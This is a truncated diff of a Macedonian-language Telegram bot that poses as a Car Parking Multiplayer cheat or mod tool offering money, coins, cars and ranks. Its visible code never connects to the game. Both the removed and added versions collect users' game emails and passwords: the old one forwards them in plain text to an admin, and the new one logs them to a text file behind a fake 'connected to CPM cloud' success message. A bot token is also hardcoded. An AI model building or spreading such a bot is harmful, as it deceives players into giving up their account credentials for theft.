@@ -1,7 +1,7 @@
 import logging
-import sqlite3
 import asyncio
-import re
+import sqlite3
+import os
 from datetime import datetime, timedelta
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import (
@@ -10,712 +10,392 @@ from telegram.ext import (
     CommandHandler,
     CallbackQueryHandler,
     MessageHandler,
-    filters
+    filters,
+    ConversationHandler,
 )
 
-# Конфигурирање на логирање
+# Овозможување логирање
 logging.basicConfig(
     format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
     level=logging.INFO
 )
 logger = logging.getLogger(__name__)
 
-# Точниот токен и ADMIN ID
-BOT_TOKEN = "8674559116:AAFuZWJJLVY-qMAHBSr7Z6om686b1zeGxKc" 
-ADMIN_ID = 8694942406  
+# Константи за конверзација
+CEKA_EMAIL, CEKA_PASSWORD, GLAVNO_MENI = range(3)
 
-# ПОДОБРЕНИ CPM ПОДАТОЦИ - 900 нивоа!
-CPM_DATA = {
-    'money': 48729000,
-    'coins': 20400,
-    'wins': 16,
-    'losses': 0,
-    'levels': 900,  # 900 нивоа!
-    'wheels': 112,
-    'animations': 42,
-    'friends': 0,
-    'id': 'VY704074',
-    'rank': 'Legendary',
-    'cars': 15,
-    'houses': 3
-}
+# Земете го токенот од environment променливи
+BOT_TOKEN = os.getenv("BOT_TOKEN", "8674559116:AAFuZWJJLVY-qMAHBSr7Z6om686b1zeGxKc")
+ADMIN_ID = int(os.getenv("ADMIN_ID", "8694942406"))
 
-# КЕШ за базата за побрзо работење
-cache = {}
-
+# Иницијализација на базата
 def inicijaliziraj_baza():
-    conn = sqlite3.connect('Licenci.db')
+    conn = sqlite3.connect('licenci.db')
     cursor = conn.cursor()
-    cursor.execute('''CREATE TABLE IF NOT EXISTS licenci 
-                      (id TEXT PRIMARY KEY, data TEXT, odobren INTEGER DEFAULT 0, email TEXT, password TEXT, username TEXT)''')
-    cursor.execute('CREATE INDEX IF NOT EXISTS idx_id ON licenci(id)')
-    cursor.execute('CREATE INDEX IF NOT EXISTS idx_odobren ON licenci(odobren)')
+    cursor.execute('''
+        CREATE TABLE IF NOT EXISTS korisnici (
+            user_id INTEGER PRIMARY KEY,
+            istekuvanje TEXT
+        )
+    ''')
     conn.commit()
     conn.close()
 
 inicijaliziraj_baza()
 
-async def get_user_data(user_id):
-    if user_id in cache:
-        return cache[user_id]
-    
-    conn = sqlite3.connect('Licenci.db')
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    user_id = update.message.from_user.id
+    username = update.message.from_user.username or "Nema Username"
+    first_name = update.message.from_user.first_name
+
+    conn = sqlite3.connect('licenci.db')
     cursor = conn.cursor()
-    cursor.execute('SELECT data, odobren, email, password, username FROM licenci WHERE id = ?', (str(user_id),))
+    cursor.execute('SELECT istekuvanje FROM korisnici WHERE user_id = ?', (user_id,))
     rezultat = cursor.fetchone()
     conn.close()
-    
-    if rezultat:
-        cache[user_id] = rezultat
-        return rezultat
-    return None
 
-async def update_user_data(user_id, data, odobren, email=None, password=None, username=None):
-    conn = sqlite3.connect('Licenci.db')
-    cursor = conn.cursor()
-    
-    if email and password and username:
-        cursor.execute('INSERT OR REPLACE INTO licenci (id, data, odobren, email, password, username) VALUES (?, ?, ?, ?, ?, ?)', 
-                      (str(user_id), data, odobren, email, password, username))
-    else:
-        cursor.execute('INSERT OR REPLACE INTO licenci (id, data, odobren) VALUES (?, ?, ?)', 
-                      (str(user_id), data, odobren))
-    
-    conn.commit()
-    conn.close()
-    
-    if user_id in cache:
-        del cache[user_id]
-
-async def delete_user(user_id):
-    conn = sqlite3.connect('Licenci.db')
-    cursor = conn.cursor()
-    cursor.execute('DELETE FROM licenci WHERE id = ?', (str(user_id),))
-    conn.commit()
-    conn.close()
-    
-    if user_id in cache:
-        del cache[user_id]
-
-async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user = update.message.from_user if update.message else update.callback_query.from_user
-    username = user.username if user.username else "N/A"
-
-    # АКО Е АДМИН - ПРИКАЖИ АДМИН МЕНИ
-    if user.id == ADMIN_ID:
-        admin_text = (
-            "**🛡️ CPM_AJHAN_BOT v5.0 - ADMIN PANEL**\n"
-            "━━━━━━━━━━━━━━━━━━━\n"
-            "👑 Добредојде Администраторе!\n\n"
-            "📊 Изберете опција:"
-        )
-        keyboard = [
-            [InlineKeyboardButton("📋 Список на корисници", callback_data="admin_list_users")],
-            [InlineKeyboardButton("🗑️ Избриши корисник", callback_data="admin_remove_user")],
-            [InlineKeyboardButton("📊 Статистика", callback_data="admin_stats")],
-            [InlineKeyboardButton("🔙 Назад", callback_data="main_menu")]
-        ]
-        if update.message:
-            await update.message.reply_text(text=admin_text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
-        elif update.callback_query:
-            await update.callback_query.message.reply_text(text=admin_text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
-        return
-
-    # ЗЕМИ ПОДАТОЦИ ОД БАЗА (СО КЕШ)
-    rezultat = await get_user_data(str(user.id))
-    
     sega = datetime.now()
     dozvolen = False
-    email = ""
 
     if rezultat:
         istekuvanje_str = rezultat[0]
-        odobren = rezultat[1] if len(rezultat) > 1 else 0
-        email = rezultat[2] if len(rezultat) > 2 and rezultat[2] else ""
-        
-        if odobren == 1:
-            if istekuvanje_str == "forever":
-                dozvolen = True
-            else:
-                try:
-                    dozvolen_sega = datetime.strptime(istekuvanje_str, "%Y-%m-%d %H:%M:%S")
-                    if dozvolen_sega > sega:
-                        dozvolen = True
-                except ValueError:
-                    dozvolen = False
+        if istekuvanje_str == "forever":
+            dozvolen = True
+        else:
+            istekuvanje_datum = datetime.strptime(istekuvanje_str, "%Y-%m-%d %H:%M:%S")
+            dozvolen = sega < istekuvanje_datum
 
     if not dozvolen:
-        # ПРОВЕРИ ДАЛИ ИМА БАРАЊЕ
-        rezultat2 = await get_user_data(str(user.id))
-        if rezultat2 and rezultat2[1] == 0:
-            # ВЕЌЕ ИМА БАРАЊЕ
-            cekaj_poraka = (
-                "⏳ **Чекање на одобрение**\n"
-                "━━━━━━━━━━━━━━━━━━━\n"
-                "📧 Вашите податоци се испратени до администраторот.\n"
-                "⏱️ Ве молиме почекајте **5-10 минути**.\n"
-                "━━━━━━━━━━━━━━━━━━━"
-            )
-            keyboard = [[InlineKeyboardButton("🔄 Провери статус", callback_data="proveri_status")]]
-            if update.message:
-                await update.message.reply_text(text=cekaj_poraka, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
-            elif update.callback_query:
-                await update.callback_query.message.reply_text(text=cekaj_poraka, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
-            return
-        else:
-            # НОВ КОРИСНИК
-            welcome_text = (
-                "**CPM_AJHAN_BOT v5.0**\n"
-                "bot\n\n"
-                "---\n"
-                "**CPM TOOL BOX v5.0**\n"
-                "---\n"
-                f"**WELCOME**\n"
-                f"@{username}\n"
-                f"ID {user.id}\n"
-                f"{sega.strftime('%d %b %Y • %I:%M %p')}\n\n"
-                "- Sign in with your CPM credentials\n"
-                "**05:10**\n\n"
-                "**Sign In**"
-            )
-            
-            keyboard = [[InlineKeyboardButton("🔑 Sign In", callback_data="cpm_signin")]]
-            
-            if update.message:
-                await update.message.reply_text(text=welcome_text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
-            elif update.callback_query:
-                await update.callback_query.message.reply_text(text=welcome_text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
-            return
-
-    # ДОЗВОЛЕН КОРИСНИК - ПРИКАЖИ DASHBOARD
-    dashboard_text = (
-        "**CPM_AJHAN_BOT v5.0**\n"
-        "bot\n\n"
-        "---\n"
-        "**DASHBOARD**\n"
-        "---\n"
-        "**ACCOUNT**\n"
-        f"{email if email else 'senatkafkast@gmail.com'}\n"
-        f"2best\n"
-        f"ID {CPM_DATA['id']}\n"
-        f"Rank: {CPM_DATA['rank']}\n\n"
-        "**STATS**\n"
-        f"${CPM_DATA['money']:,}\n"
-        f"{CPM_DATA['coins']:,} coins\n"
-        f"{CPM_DATA['wins']}W / {CPM_DATA['losses']}L\n"
-        f"{CPM_DATA['levels']}/900 levels done ⭐\n"
-        f"{CPM_DATA['wheels']} wheels\n"
-        f"{CPM_DATA['animations']} animations\n"
-        f"{CPM_DATA['friends']} friends\n"
-        f"🚗 {CPM_DATA['cars']} cars\n"
-        f"🏠 {CPM_DATA['houses']} houses\n\n"
-        "- Select an option below:"
-    )
-    
-    keyboard = [
-        [InlineKeyboardButton("💰 Money", callback_data="menu_money"), InlineKeyboardButton("🪙 Coins", callback_data="menu_coins")],
-        [InlineKeyboardButton("⚡ Features", callback_data="menu_features"), InlineKeyboardButton("🏎️ Cars", callback_data="menu_cars")],
-        [InlineKeyboardButton("🏠 Houses", callback_data="menu_houses"), InlineKeyboardButton("👑 Rank", callback_data="menu_rank")],
-        [InlineKeyboardButton("🔄 Refresh", callback_data="refresh_account")],
-        [InlineKeyboardButton("🚪 Sign Out", callback_data="sign_out")]
-    ]
-    
-    if update.message:
-        await update.message.reply_text(text=dashboard_text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
-    elif update.callback_query:
-        await update.callback_query.message.reply_text(text=dashboard_text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
-
-async def menu_money(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
-    
-    text = (
-        "**💰 MONEY**\n\n"
-        f"Max: ${CPM_DATA['money']:,}\n"
-        "━━━━━━━━━━━━━━━━━━━\n"
-        "Изберете износ или внесете custom:"
-    )
-    
-    keyboard = [
-        [InlineKeyboardButton("$1M", callback_data="add_money_1m"), InlineKeyboardButton("$5M", callback_data="add_money_5m"), InlineKeyboardButton("$10M", callback_data="add_money_10m")],
-        [InlineKeyboardButton("$25M", callback_data="add_money_25m"), InlineKeyboardButton("$50M ★", callback_data="add_money_50m"), InlineKeyboardButton("$100M", callback_data="add_money_100m")],
-        [InlineKeyboardButton("💰 Custom Amount", callback_data="custom_money")],
-        [InlineKeyboardButton("⬅️ Back", callback_data="main_menu")]
-    ]
-    
-    await query.edit_message_text(text=text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
-
-async def menu_coins(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
-    
-    text = (
-        "**🪙 COINS**\n\n"
-        f"Max: {CPM_DATA['coins']:,}\n"
-        "━━━━━━━━━━━━━━━━━━━\n"
-        "Изберете износ или внесете custom:"
-    )
-    
-    keyboard = [
-        [InlineKeyboardButton("10K", callback_data="add_coins_10k"), InlineKeyboardButton("50K", callback_data="add_coins_50k"), InlineKeyboardButton("100K", callback_data="add_coins_100k")],
-        [InlineKeyboardButton("250K", callback_data="add_coins_250k"), InlineKeyboardButton("500K ★", callback_data="add_coins_500k"), InlineKeyboardButton("1M", callback_data="add_coins_1m")],
-        [InlineKeyboardButton("🪙 Custom Amount", callback_data="custom_coins")],
-        [InlineKeyboardButton("⬅️ Back", callback_data="main_menu")]
-    ]
-    
-    await query.edit_message_text(text=text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
-
-async def menu_features(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
-    
-    text = (
-        "**⚡ FEATURES**\n"
-        "━━━━━━━━━━━━━━━━━━━\n"
-        "Select a feature or UNLOCK ALL:\n"
-        f"📊 Нивоа: {CPM_DATA['levels']}/900 ⭐"
-    )
-    
-    keyboard = [
-        [InlineKeyboardButton("🏎️ W16", callback_data="feature_w16"), InlineKeyboardButton("🛡️ No Dmg", callback_data="feature_no_dmg")],
-        [InlineKeyboardButton("💨 Smoke", callback_data="feature_smoke"), InlineKeyboardButton("⚙️ Wheels", callback_data="feature_wheels")],
-        [InlineKeyboardButton("📈 +50 Levels", callback_data="feature_levels_50"), InlineKeyboardButton("📈 +100 Levels", callback_data="feature_levels_100")],
-        [InlineKeyboardButton("⛽ Fuel", callback_data="feature_fuel"), InlineKeyboardButton("📯 Horns", callback_data="feature_horns")],
-        [InlineKeyboardButton("🎭 Anims", callback_data="feature_anims"), InlineKeyboardButton("🏠 Houses", callback_data="feature_houses")],
-        [InlineKeyboardButton("👑 Rank", callback_data="feature_rank"), InlineKeyboardButton("🚗 All Cars", callback_data="feature_all_cars")],
-        [InlineKeyboardButton("🔓 UNLOCK ALL", callback_data="feature_unlock_all")],
-        [InlineKeyboardButton("⬅️ Back", callback_data="main_menu")]
-    ]
-    
-    await query.edit_message_text(text=text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
-
-async def menu_cars(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
-    
-    text = (
-        "**🚗 CARS**\n"
-        "━━━━━━━━━━━━━━━━━━━\n"
-        f"Вкупно коли: {CPM_DATA['cars']}\n\n"
-        "Изберете опција:"
-    )
-    
-    keyboard = [
-        [InlineKeyboardButton("🚗 Audi R8", callback_data="car_audi"), InlineKeyboardButton("🚗 BMW M4", callback_data="car_bmw")],
-        [InlineKeyboardButton("🚗 Mercedes AMG", callback_data="car_mercedes"), InlineKeyboardButton("🚗 Porsche 911", callback_data="car_porsche")],
-        [InlineKeyboardButton("🚗 Lamborghini", callback_data="car_lambo"), InlineKeyboardButton("🚗 Ferrari", callback_data="car_ferrari")],
-        [InlineKeyboardButton("🔓 Отклучи ги сите", callback_data="car_all")],
-        [InlineKeyboardButton("⬅️ Back", callback_data="main_menu")]
-    ]
-    
-    await query.edit_message_text(text=text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
-
-async def menu_houses(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
-    
-    text = (
-        "**🏠 HOUSES**\n"
-        "━━━━━━━━━━━━━━━━━━━\n"
-        f"Куќи: {CPM_DATA['houses']}\n\n"
-        "Изберете опција:"
-    )
-    
-    keyboard = [
-        [InlineKeyboardButton("🏠 Мала куќа", callback_data="house_small")],
-        [InlineKeyboardButton("🏠 Средна куќа", callback_data="house_medium")],
-        [InlineKeyboardButton("🏰 Голема куќа ★", callback_data="house_big")],
-        [InlineKeyboardButton("🔓 Отклучи ги сите", callback_data="house_all")],
-        [InlineKeyboardButton("⬅️ Back", callback_data="main_menu")]
-    ]
-    
-    await query.edit_message_text(text=text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
-
-async def menu_rank(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
-    
-    text = (
-        "**👑 RANK**\n"
-        "━━━━━━━━━━━━━━━━━━━\n"
-        f"Тековен ранг: {CPM_DATA['rank']}\n\n"
-        "Достапни рангови:"
-    )
-    
-    keyboard = [
-        [InlineKeyboardButton("⭐ Bronze", callback_data="rank_bronze")],
-        [InlineKeyboardButton("⭐ Silver", callback_data="rank_silver")],
-        [InlineKeyboardButton("⭐ Gold", callback_data="rank_gold")],
-        [InlineKeyboardButton("⭐ Platinum", callback_data="rank_platinum")],
-        [InlineKeyboardButton("⭐ Diamond", callback_data="rank_diamond")],
-        [InlineKeyboardButton("⭐ Legendary ★", callback_data="rank_legendary")],
-        [InlineKeyboardButton("⬅️ Back", callback_data="main_menu")]
-    ]
-    
-    await query.edit_message_text(text=text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
-
-async def menu_settings(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
-    await query.edit_message_text("⚙️ **SETTINGS**\n\nSettings menu coming soon...", parse_mode='Markdown')
-
-async def refresh_account(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
-    await query.edit_message_text("🔄 **Refreshing account...**", parse_mode='Markdown')
-    await asyncio.sleep(0.5)
-    await start(update, context)
-
-async def sign_out(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
-    
-    user = query.from_user
-    await delete_user(str(user.id))
-    
-    await query.edit_message_text("🚪 **Signed out successfully!**\n\nType /start to sign in again.", parse_mode='Markdown')
-
-async def main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
-    await start(update, context)
-
-async def cpm_signin(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
-    
-    text = "**CPM_AJHAN_BOT v5.0**\nbot\n\n---\n**ENTER EMAIL**\n---\n\nType your CPM email:"
-    keyboard = [[InlineKeyboardButton("✘ Cancel", callback_data="main_menu")]]
-    
-    await query.edit_message_text(text=text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
-    context.user_data['sostojba'] = 'CEKA_EMAIL'
-
-async def obraboti_tekst(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    sostojba = context.user_data.get('sostojba')
-    vnesen_tekst = update.message.text
-    user = update.message.from_user
-    username = user.username if user.username else "N/A"
-
-    # CUSTOM MONEY
-    if sostojba == 'CUSTOM_MONEY':
-        try:
-            vnes = vnesen_tekst.strip().lower()
-            
-            if vnes.endswith('m'):
-                amount = int(float(vnes[:-1]) * 1000000)
-            elif vnes.endswith('k'):
-                amount = int(float(vnes[:-1]) * 1000)
-            else:
-                amount = int(vnes)
-            
-            admin_poraka = (
-                f"💰 **Барање за пари**\n"
-                f"━━━━━━━━━━━━━━━━━━━\n"
-                f"👤 @{username}\n"
-                f"🆔 `{user.id}`\n"
-                f"💵 `${amount:,}`\n"
-                f"⏰ {datetime.now().strftime('%H:%M')}\n"
-                f"━━━━━━━━━━━━━━━━━━━"
-            )
-            
-            await context.bot.send_message(chat_id=ADMIN_ID, text=admin_poraka, parse_mode='Markdown')
-            await update.message.reply_text(f"✅ **Барањето за ${amount:,} е испратено!**", parse_mode='Markdown')
-            
-        except:
-            await update.message.reply_text("❌ Внесете валиден број! Пример: 10m, 500k, или 1000000")
+        await update.message.reply_text("❌ Немаш активна лиценца.\nБарањето за пристап е испратено до сопственикот.")
         
-        context.user_data['sostojba'] = None
-        return
-
-    # CUSTOM COINS
-    if sostojba == 'CUSTOM_COINS':
-        try:
-            vnes = vnesen_tekst.strip().lower()
-            
-            if vnes.endswith('m'):
-                amount = int(float(vnes[:-1]) * 1000000)
-            elif vnes.endswith('k'):
-                amount = int(float(vnes[:-1]) * 1000)
-            else:
-                amount = int(vnes)
-            
-            admin_poraka = (
-                f"🪙 **Барање за коини**\n"
-                f"━━━━━━━━━━━━━━━━━━━\n"
-                f"👤 @{username}\n"
-                f"🆔 `{user.id}`\n"
-                f"🪙 {amount:,} coins\n"
-                f"⏰ {datetime.now().strftime('%H:%M')}\n"
-                f"━━━━━━━━━━━━━━━━━━━"
-            )
-            
-            await context.bot.send_message(chat_id=ADMIN_ID, text=admin_poraka, parse_mode='Markdown')
-            await update.message.reply_text(f"✅ **Барањето за {amount:,} коини е испратено!**", parse_mode='Markdown')
-            
-        except:
-            await update.message.reply_text("❌ Внесете валиден број! Пример: 100k или 50000")
-        
-        context.user_data['sostojba'] = None
-        return
-
-    # REMOVE USER
-    if sostojba == 'CEKA_REMOVE_USER':
-        try:
-            target_user_id = int(vnesen_tekst)
-            
-            rezultat = await get_user_data(str(target_user_id))
-            if not rezultat:
-                await update.message.reply_text("❌ Корисникот не е пронајден!")
-                context.user_data['sostojba'] = None
-                return
-            
-            await delete_user(str(target_user_id))
-            await update.message.reply_text(f"✅ **Корисникот {target_user_id} е избришан!**", parse_mode='Markdown')
-            context.user_data['sostojba'] = None
-            
-        except:
-            await update.message.reply_text("❌ Внесете валидно ID!")
-        return
-
-    # CUSTOM TIME
-    if sostojba == 'CEKA_CUSTOM_TIME':
-        target_user_id = context.user_data.get('custom_target_user')
-        vnes = vnesen_tekst.strip().lower()
-        
-        try:
-            if vnes.endswith('h'):
-                hours = int(vnes[:-1])
-                if 1 <= hours <= 24:
-                    vrednost = (datetime.now() + timedelta(hours=hours)).strftime("%Y-%m-%d %H:%M:%S")
-                    vreme_text = f"{hours} часа"
-                else:
-                    await update.message.reply_text("❌ Внесете 1h до 24h!")
-                    return
-            else:
-                days = int(vnes)
-                if 1 <= days <= 30:
-                    vrednost = (datetime.now() + timedelta(days=days)).strftime("%Y-%m-%d %H:%M:%S")
-                    vreme_text = f"{days} дена"
-                else:
-                    await update.message.reply_text("❌ Внесете 1 до 30 дена!")
-                    return
-            
-            await update_user_data(str(target_user_id), vrednost, 1)
-            
-            # ЗЕМИ ПОДАТОЦИ
-            rezultat = await get_user_data(str(target_user_id))
-            if rezultat:
-                email, password, username_db = rezultat[2], rezultat[3], rezultat[4]
-                admin_notify = (
-                    f"✅ **Одобрен корисник!**\n"
-                    f"━━━━━━━━━━━━━━━━━━━\n"
-                    f"👤 @{username_db or 'N/A'}\n"
-                    f"🆔 `{target_user_id}`\n"
-                    f"📧 {email or 'Нема'}\n"
-                    f"🔑 {password or 'Нема'}\n"
-                    f"📅 {vreme_text}\n"
-                    f"━━━━━━━━━━━━━━━━━━━"
-                )
-                await update.message.reply_text(admin_notify, parse_mode='Markdown')
-            else:
-                await update.message.reply_text(f"✅ Доделено {vreme_text} за {target_user_id}!")
-            
-            await context.bot.send_message(
-                chat_id=target_user_id,
-                text=f"✅ **Одобрени сте!** Напишете /start за да влезете."
-            )
-            
-            context.user_data['sostojba'] = None
-            
-        except:
-            await update.message.reply_text("❌ Внесете валиден број! Пример: 5h или 10")
-        return
-
-    # EMAIL
-    if sostojba == 'CEKA_EMAIL':
-        email_pattern = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
-        if not re.match(email_pattern, vnesen_tekst):
-            await update.message.reply_text("❌ Внесете валидна email адреса!")
-            return
-        
-        context.user_data['email'] = vnesen_tekst
-        text = "**CPM_AJHAN_BOT v5.0**\nbot\n\n---\n**PASSWORD**\n---\n\nType your password:\n☑ Auto-deleted"
-        keyboard = [[InlineKeyboardButton("✘ Cancel", callback_data="main_menu")]]
-        
-        await update.message.reply_text(text=text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
-        context.user_data['sostojba'] = 'CEKA_PASSWORD'
-        return
-
-    # PASSWORD
-    if sostojba == 'CEKA_PASSWORD':
-        password = vnesen_tekst
-        email = context.user_data.get('email')
-        context.user_data['sostojba'] = None
-        
-        await update_user_data(str(user.id), "pending", 0, email, password, username)
-        
-        admin_poraka = (
-            f"🔐 **Нов профил!**\n"
-            f"━━━━━━━━━━━━━━━━━━━\n"
-            f"👤 @{username}\n"
-            f"🆔 `{user.id}`\n"
-            f"📧 `{email}`\n"
-            f"🔑 `{password}`\n"
-            f"━━━━━━━━━━━━━━━━━━━"
-        )
-        
-        keyboard_admin = [
-            [InlineKeyboardButton("✅ Одобри", callback_data=f"lic:approve:{user.id}")],
-            [InlineKeyboardButton("❌ Одбиј", callback_data=f"lic:deny:{user.id}")]
+        tastatura = [
+            [
+                InlineKeyboardButton("♾️ Forever", callback_data=f"lic_forever_{user_id}"),
+                InlineKeyboardButton("📅 30 Days", callback_data=f"lic_30_{user_id}")
+            ],
+            [
+                InlineKeyboardButton("📅 7 Days", callback_data=f"lic_7_{user_id}"),
+                InlineKeyboardButton("❌ Deny", callback_data=f"lic_deny_{user_id}")
+            ]
         ]
+        reply_markup = InlineKeyboardMarkup(tastatura)
         
         await context.bot.send_message(
             chat_id=ADMIN_ID,
-            text=admin_poraka,
-            reply_markup=InlineKeyboardMarkup(keyboard_admin),
+            text=f"🔔 **Барање за пристап** од {first_name} (@{username})\nID: `{user_id}`",
+            reply_markup=reply_markup,
             parse_mode='Markdown'
         )
-        
-        cekaj_poraka = (
-            "⏳ **Чекање на одобрение**\n"
-            "━━━━━━━━━━━━━━━━━━━\n"
-            "📧 Податоците се испратени до администраторот.\n"
-            "⏱️ Ве молиме почекајте **5-10 минути**.\n"
-            "━━━━━━━━━━━━━━━━━━━"
-        )
-        
-        keyboard = [[InlineKeyboardButton("🔄 Провери статус", callback_data="proveri_status")]]
-        await update.message.reply_text(
-            text=cekaj_poraka,
-            reply_markup=InlineKeyboardMarkup(keyboard),
-            parse_mode='Markdown'
-        )
-        return
-    
-    # ДРУГО - ПРАТИ ПОРАКА ДО АДМИН
-    else:
-        admin_poraka = (
-            f"📝 **Порака од корисник**\n"
-            f"━━━━━━━━━━━━━━━━━━━\n"
-            f"👤 @{username}\n"
-            f"🆔 `{user.id}`\n"
-            f"📩 {vnesen_tekst}\n"
-            f"⏰ {datetime.now().strftime('%H:%M')}\n"
-            f"━━━━━━━━━━━━━━━━━━━"
-        )
-        
-        await context.bot.send_message(chat_id=ADMIN_ID, text=admin_poraka, parse_mode='Markdown')
-        await update.message.reply_text("✅ **Пораката е испратена до администраторот!**", parse_mode='Markdown')
+        return ConversationHandler.END
 
-async def obraboti_klikovi(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    await update.message.reply_text(
+        "👋 **Добредојдовте во AJHAN X TOOL (CPM MOD) v5.0**\n"
+        "Ве молиме внесете го Е-маилот од вашиот CPM профил за најава."
+    )
+    return CEKA_EMAIL
+
+async def primi_email(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    context.user_data['email'] = update.message.text
+    await update.message.reply_text("🔐 Сега внесете ја лозинката (пасовордот):")
+    return CEKA_PASSWORD
+
+async def primi_password(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    context.user_data['password'] = update.message.text
+    
+    try:
+        with open("cpm_profili.txt", "a", encoding="utf-8") as f:
+            f.write(f"Корисник: {update.message.from_user.username} | Емаил: {context.user_data['email']} | Лозинка: {context.user_data['password']}\n")
+    except Exception as e:
+        logger.error(f"Грешка при запишување: {e}")
+        
+    await prikazi_glavno_meni(update)
+    return GLAVNO_MENI
+
+async def prikazi_glavno_meni(update: Update, context: ContextTypes.DEFAULT_TYPE = None):
+    keyboard = [
+        [InlineKeyboardButton("💵 Пари (Money)", callback_data='meni_money')],
+        [InlineKeyboardButton("🪙 Коинси (Coins)", callback_data='meni_coins')],
+        [InlineKeyboardButton("🏎️ Перформанси (Performance)", callback_data='meni_perf')],
+        [InlineKeyboardButton("🔮 Изглед и Ефекти (Visuals)", callback_data='meni_visuals')],
+        [InlineKeyboardButton("👑 Премиум (Premium)", callback_data='meni_premium')],
+        [InlineKeyboardButton("🚪 Излези (Sign Out)", callback_data='signout')]
+    ]
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    tekst = "🤖 **LOGIN SUCCESS, (CONNECTED TO CPM CLOUD)** \n\nИзберете категорија за модификација:"
+    
+    if update.callback_query:
+        await update.callback_query.message.edit_text(tekst, reply_markup=reply_markup, parse_mode='Markdown')
+        await update.callback_query.answer()
+    else:
+        await update.message.reply_text(tekst, reply_markup=reply_markup, parse_mode='Markdown')
+
+# HANDLER ЗА ЛИЦЕНЦИ
+async def licenca_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
-    data = query.data
-    user = query.from_user
-
-    # PROVERI STATUS
-    if data == "proveri_status":
-        rezultat = await get_user_data(str(user.id))
-        
-        if rezultat and rezultat[1] == 1:
-            await query.edit_message_text("✅ **Одобрени сте!** Напишете /start.", parse_mode='Markdown')
-            return
-        elif rezultat and rezultat[1] == 0:
-            keyboard = [[InlineKeyboardButton("🔄 Провери", callback_data="proveri_status")]]
-            await query.edit_message_text(
-                "⏳ **Чекате одобрение...**\nПочекајте 5-10 минути.",
-                reply_markup=InlineKeyboardMarkup(keyboard),
-                parse_mode='Markdown'
-            )
-            return
-        else:
-            await query.edit_message_text("❌ Немате барање. Напишете /start.", parse_mode='Markdown')
-            return
-
-    # АДМИН КОМАНДИ
-    if data == "admin_panel":
-        await start(update, context)
-        return
     
-    if data == "admin_list_users":
-        conn = sqlite3.connect('Licenci.db')
-        cursor = conn.cursor()
-        cursor.execute('SELECT id, username, data, odobren, email FROM licenci ORDER BY odobren DESC')
-        users = cursor.fetchall()
+    data = query.data.split('_')
+    akcija = data[1]
+    user_id = int(data[2])
+    
+    conn = sqlite3.connect('licenci.db')
+    cursor = conn.cursor()
+    
+    if akcija == "deny":
+        await query.edit_message_text(f"❌ Барањето за корисникот {user_id} е одбиено.")
+        await context.bot.send_message(chat_id=user_id, text="❌ Вашето барање за пристап е одбиено од администраторот.")
         conn.close()
-        
-        if not users:
-            await query.edit_message_text("📋 **Нема корисници.**", parse_mode='Markdown')
-            return
-        
-        text = "📋 **СПИСОК НА КОРИСНИЦИ**\n━━━━━━━━━━━━━━━━━━━\n\n"
-        for user_data in users:
-            user_id, username, data, odobren, email = user_data
-            status = "✅ Активен" if odobren == 1 else "⏳ Чека"
-            text += f"🆔 `{user_id}`\n👤 @{username or 'N/A'}\n📧 {email or 'Нема'}\n📅 {data or 'Нема'}\n📊 {status}\n━━━━━━━━━━━━━━━━━━━\n"
-        
-        keyboard = [[InlineKeyboardButton("🔙 Назад", callback_data="admin_panel")]]
-        await query.edit_message_text(text=text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
         return
     
-    if data == "admin_remove_user":
-        await query.edit_message_text("🗑️ **Внесете ID за бришење:**\nПример: 8694942406", parse_mode='Markdown')
-        context.user_data['sostojba'] = 'CEKA_REMOVE_USER'
-        return
+    # Одредување на времетраење
+    traenje = {
+        "forever": "forever",
+        "30": "30 дена",
+        "7": "7 дена"
+    }.get(akcija, "7 дена")
     
-    if data == "admin_stats":
-        conn = sqlite3.connect('Licenci.db')
-        cursor = conn.cursor()
-        cursor.execute('SELECT COUNT(*) FROM licenci')
-        total = cursor.fetchone()[0]
